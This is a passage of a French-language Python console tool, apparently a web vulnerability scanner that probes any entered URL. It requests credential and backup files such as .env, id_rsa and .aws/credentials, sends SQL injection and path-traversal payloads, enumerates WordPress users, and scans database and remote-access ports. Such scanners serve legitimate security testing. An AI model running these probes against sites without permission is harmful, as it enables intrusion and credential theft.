        "/.DS_Store", "/.htaccess", "/.htpasswd", "/.user.ini",
        "/config.php", "/config.yml", "/config.json", "/config.xml",
        "/wp-config.php", "/wp-config.php.bak", "/wp-config.txt",
        "/settings.php", "/settings.py",
        "/backup.zip", "/backup.tar.gz", "/backup.sql",
        "/dump.sql", "/database.sql", "/db.sql",
        "/site.zip", "/www.zip", "/html.zip",
        "/admin", "/admin.php", "/administrator",
        "/wp-admin", "/wp-login.php",
        "/login", "/login.php", "/signin",
        "/phpmyadmin", "/pma", "/adminer.php",
        "/manager/html", "/console",
        "/phpinfo.php", "/info.php", "/test.php",
        "/debug.php", "/debug", "/status",
        "/server-status", "/server-info",
        "/swagger.json", "/openapi.json", "/api-docs",
        "/graphql", "/api/v1", "/api/v2",
        "/package.json", "/composer.json", "/composer.lock",
        "/Dockerfile", "/docker-compose.yml",
        "/.env.example", "/.env.old", "/.env.save",
        "/web.config", "/app.config", "/appsettings.json",
        "/robots.txt", "/sitemap.xml", "/readme.html",
        "/CHANGELOG.txt", "/INSTALL.txt",
        "/xmlrpc.php", "/wp-json/wp/v2/users",
        "/id_rsa", "/id_dsa", "/private.key",
        "/cert.pem", "/.ssh/authorized_keys",
        "/.aws/credentials", "/.npmrc", "/.pypirc",
        "/credentials.txt", "/passwords.txt",
        "/.bash_history", "/.mysql_history",
    ]

    COMMON_PARAMS = ["id", "page", "url", "file", "path", "q", "s", "search", "redirect", "next", "return", "cat", "view"]

    SQLI_PAYLOADS = [
        "'", "\"", "')", "';", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR 1=1--", "' OR 1=1#",
    ]
    SQLI_ERRORS = [
        "you have an error in your sql syntax",
        "warning: mysql", "unclosed quotation mark",
        "sqlstate", "syntax error", "microsoft ole db",
        "postgresql", "sqlite error", "ora-0",
    ]

    LFI_PAYLOADS = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
    ]
    LFI_SIGNATURES = [
        "root:x:0:0:", "[extensions]", "daemon:x:", "bin:x:", "nobody:x:",
    ]

    findings = []
    fl = threading.Lock()

    def add(sev, cat, detail, ev=""):
        with fl:
            findings.append((sev, cat, detail, ev))

    def get(url, allow_redirects=True):
        try:
            return requests.get(url, headers={"User-Agent": UA}, timeout=TIMEOUT,
                                allow_redirects=allow_redirects, verify=False)
        except Exception:
            return None

    def normalize(u):
        u = u.strip()
        if not u:
            return None
        if not u.startswith(("http://", "https://")):
            u = "https://" + u
        return u.rstrip("/")

    def check_headers(headers):
        lh = {k.lower(): v for k, v in headers.items()}
        csp = lh.get("content-security-policy", "").lower()
        if "x-frame-options" not in lh and "frame-ancestors" not in csp:
            add("MEDIUM", "Clickjacking", "No X-Frame-Options / CSP frame-ancestors")
        if "content-security-policy" not in lh:
            add("MEDIUM", "Missing Header", "Content-Security-Policy absent")
        if "strict-transport-security" not in lh:
            add("LOW", "Missing Header", "Strict-Transport-Security absent")
        if "x-content-type-options" not in lh:
            add("LOW", "Missing Header", "X-Content-Type-Options absent")
        if "referrer-policy" not in lh:
            add("LOW", "Missing Header", "Referrer-Policy absent")
        server = headers.get("Server", "")
        if server and any(c.isdigit() for c in server):
            add("LOW", "Info Disclosure", f"Server: {server}")
        powered = headers.get("X-Powered-By", "")
        if powered:
            add("LOW", "Info Disclosure", f"X-Powered-By: {powered}")

    def check_cors(target):
        r = get(target)
        if not r:
            return
        try:
            r2 = requests.get(target, headers={"User-Agent": UA, "Origin": "https://evil.invalid"}, timeout=TIMEOUT, verify=False)
            acao = r2.headers.get("Access-Control-Allow-Origin", "")
            if acao == "*":
                add("MEDIUM", "CORS", "Access-Control-Allow-Origin: *")
            elif "evil.invalid" in acao:
                add("HIGH", "CORS", f"Reflects Origin ({acao})")
        except Exception:
            pass

    def check_ssl(target):
        if not target.startswith("https://"):
            add("MEDIUM", "HTTPS", "Site does not use HTTPS")
            return
        try:
            parsed = urllib.parse.urlparse(target)
            hostname = parsed.hostname
            if not hostname:
                return
            ctx = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as raw:
                with ctx.wrap_socket(raw, server_hostname=hostname) as conn:
                    print(f"{GREEN}[+] TLS : {conn.version()}{RESET}")
        except ssl.SSLCertVerificationError:
            add("HIGH", "SSL Certificate", "Verification failed")
        except Exception:
            pass

    def check_sensitive(target, path):
        r = get(target + path, allow_redirects=False)
        if not r:
            return
        if r.status_code == 200 and r.content:
            ct = r.headers.get("Content-Type", "").lower()
            if "text/html" in ct and len(r.content) < 200:
                return
            size = len(r.content)
            sev = "HIGH" if any(x in path for x in (".env", ".git", "config", "backup", "sql", "key", "credentials", "passwords")) else "MEDIUM"
            add(sev, "Sensitive File", f"{path} ({size} bytes)")

    def check_cms(target):
        r = get(target + "/wp-login.php")
        if r and r.status_code == 200:
            add("INFO", "CMS", "WordPress detecte")
            r = get(target + "/wp-json/wp/v2/users")
            if r and r.status_code == 200:
                try:
                    users = r.json()
                    if isinstance(users, list):
                        names = [u.get("slug") for u in users if u.get("slug")]
                        if names:
                            add("MEDIUM", "WordPress User Enum", f"Users exposes: {', '.join(names[:10])}")
                except Exception:
                    pass
        r = get(target + "/CHANGELOG.txt")
        if r and r.status_code == 200 and "drupal" in r.text.lower():
            add("INFO", "CMS", "Drupal detecte")
        r = get(target + "/phpmyadmin/")
        if r and r.status_code == 200 and "phpmyadmin" in r.text.lower():
            add("MEDIUM", "Admin Panel", "phpMyAdmin accessible")

    def check_sqli(target):
        for param in COMMON_PARAMS[:8]:
            for payload in SQLI_PAYLOADS[:5]:
                url = f"{target}/?{param}={urllib.parse.quote(payload)}"
                r = get(url)
                if not r:
                    continue
                body_lower = r.text.lower() if r.text else ""
                for err in SQLI_ERRORS:
                    if err in body_lower:
                        add("HIGH", "SQL Injection", f"Param '{param}' — erreur SQL",
                            f"Payload: {payload}")
                        return
                if r.status_code == 500:
                    add("MEDIUM", "SQLi (possible)", f"Param '{param}' — HTTP 500",
                        f"Payload: {payload}")
                    return

    def check_lfi(target):
        for param in ("file", "page", "path", "include", "template", "view"):
            for payload in LFI_PAYLOADS:
                url = f"{target}/?{param}={urllib.parse.quote(payload)}"
                r = get(url)
                if not r or not r.text:
                    continue
                body = r.text[:5000]
                for sig in LFI_SIGNATURES:
                    if sig in body:
                        add("HIGH", "LFI", f"Param '{param}' — fichier local lisible",
                            f"Payload: {payload}")
                        return

    def check_http_methods(target):
        try:
            r = requests.options(target, headers={"User-Agent": UA}, timeout=TIMEOUT, verify=False)
            allow = r.headers.get("Allow", "")
            if allow:
                dangerous = [m for m in ("PUT", "DELETE", "TRACE") if m in allow]
                if dangerous:
                    add("MEDIUM", "Dangerous HTTP Methods", f"Allow: {allow}")
        except Exception:
            pass

    def check_ports(target):
        parsed = urllib.parse.urlparse(target)
        host = parsed.hostname
        if not host:
            return
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            return

        COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
                        1433, 3306, 3389, 5432, 5900, 6379, 8080, 27017]

        def try_port(p):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                res = s.connect_ex((ip, p))
                s.close()
                return p if res == 0 else None
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            open_ports = [p for p in ex.map(try_port, COMMON_PORTS) if p]

        PORT_NAMES = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            1433: "MSSQL", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            5900: "VNC", 6379: "Redis", 8080: "HTTP-alt", 27017: "MongoDB",
        }
        for p in open_ports:
            name = PORT_NAMES.get(p, "unknown")
            sev = "HIGH" if p in (445, 1433, 3306, 3389, 5900, 6379, 27017) else "MEDIUM"
            add(sev, "Open Port", f"{p}/{name}")

    target = input(f"{CYAN}[?] URL -> {RESET}").strip()
    target = normalize(target)
    if not target:
        print(f"{RED}[!] URL invalide.{RESET}")
        pause()
        return

    print(f"\n{CYAN}[*] Scan de {target}...{RESET}\n")

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    r = get(target)
    if not r:
        print(f"{RED}[!] Connexion impossible.{RESET}")
        pause()
        return

    print(f"{GREEN}[+] HTTP {r.status_code}{RESET}")

    print(f"{YELLOW}[*] Analyse headers...{RESET}")
    check_headers(r.headers)

    print(f"{YELLOW}[*] Test CORS...{RESET}")
    check_cors(target)

    print(f"{YELLOW}[*] Test SSL/TLS...{RESET}")
    check_ssl(target)

    print(f"{YELLOW}[*] Test methodes HTTP...{RESET}")
    check_http_methods(target)

    print(f"{YELLOW}[*] Detection CMS...{RESET}")
    check_cms(target)

    print(f"{YELLOW}[*] Tests SQL Injection...{RESET}")
    check_sqli(target)

    print(f"{YELLOW}[*] Tests LFI...{RESET}")
    check_lfi(target)

    print(f"{YELLOW}[*] Scan {len(SENSITIVE_PATHS)} fichiers sensibles...{RESET}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        list(ex.map(lambda p: check_sensitive(target, p), SENSITIVE_PATHS))

    print(f"{YELLOW}[*] Scan des ports...{RESET}")
    check_ports(target)

    print(f"\n\n{CYAN}{BOLD}═════════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   RAPPORT DE SCAN — {target}{RESET}")
    print(f"{CYAN}{BOLD}═════════════════════════════════════════════════════{RESET}\n")

    sev_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2, "INFO": 3}
    findings.sort(key=lambda x: sev_order.get(x[0], 9))

    counters = {"HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for sev, cat, detail, ev in findings:
        counters[sev] = counters.get(sev, 0) + 1

    SEV_COLOR = {"HIGH": RED, "MEDIUM": YELLOW, "LOW": BLUE_LIGHT, "INFO": GRAY}

    for sev, cat, detail, ev in findings:
        color = SEV_COLOR.get(sev, GRAY)
        print(f"{color}[{sev:<6}]{RESET} {BOLD}{cat:<28}{RESET} : {detail}")
        if ev:
            print(f"{GRAY}         └─ {ev}{RESET}")

    print(f"\n{CYAN}   RESUME{RESET}")
    print(f"{RED}[+] HIGH    : {counters['HIGH']}{RESET}")
    print(f"{YELLOW}[+] MEDIUM  : {counters['MEDIUM']}{RESET}")
    print(f"{BLUE_LIGHT}[+] LOW     : {counters['LOW']}{RESET}")
    print(f"{GRAY}[+] INFO    : {counters['INFO']}{RESET}")
    print(f"{WHITE}[+] TOTAL   : {len(findings)}{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "WebScanner"
        out_dir.mkdir(parents=True, exist_ok=True)
        host = urllib.parse.urlparse(target).hostname or "target"
        report = out_dir / f"scan_{host}_{int(time.time())}.txt"
        with open(report, "w", encoding="utf-8") as f:
            f.write(f"Scan report for {target}\n")
            f.write(f"Date: {datetime.now().isoformat()}\n")
            f.write("=" * 60 + "\n\n")
            for sev, cat, detail, ev in findings:
                f.write(f"[{sev:<6}] {cat:<28} : {detail}\n")
                if ev:
                    f.write(f"           └─ {ev}\n")
        print(f"\n{GREEN}[+] Rapport : {report}{RESET}")
    except Exception:
        pass

    pause()


# ============================================================
#                           MAIN
# ============================================================

def main():
    set_title()
    intro()
    loading()

    while True:
        page = page_1()
        if page == 0:
            clear()
            print()
            slow_print(f"{RED}[+] Fermeture de mytool.exe...{RESET}", 0.03)
            time.sleep(0.5)
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print(f"{RED}\n[!] Tool ferme par l'utilisateur.{RESET}")
        sys.exit()